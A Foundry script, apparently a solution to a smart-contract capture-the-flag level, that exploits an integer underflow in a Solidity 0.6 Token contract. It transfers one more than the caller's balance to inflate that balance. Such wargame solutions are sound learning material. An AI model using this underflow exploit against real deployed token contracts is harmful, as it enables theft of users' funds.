// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Token} from "../src/05_Token.sol";
import {Script, console} from "forge-std/Script.sol";

contract TokenSolve is Script {
    Token token = Token(0x5326dE1A1Ba9B53512b8D60b344d8085B87ACF17);
    address inv1nc = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        uint256 balance = token.balanceOf(inv1nc);
        token.transfer(address(0), balance + 1);
        console.log("Balance After#", token.balanceOf(inv1nc));

        vm.stopBroadcast();
    }
}
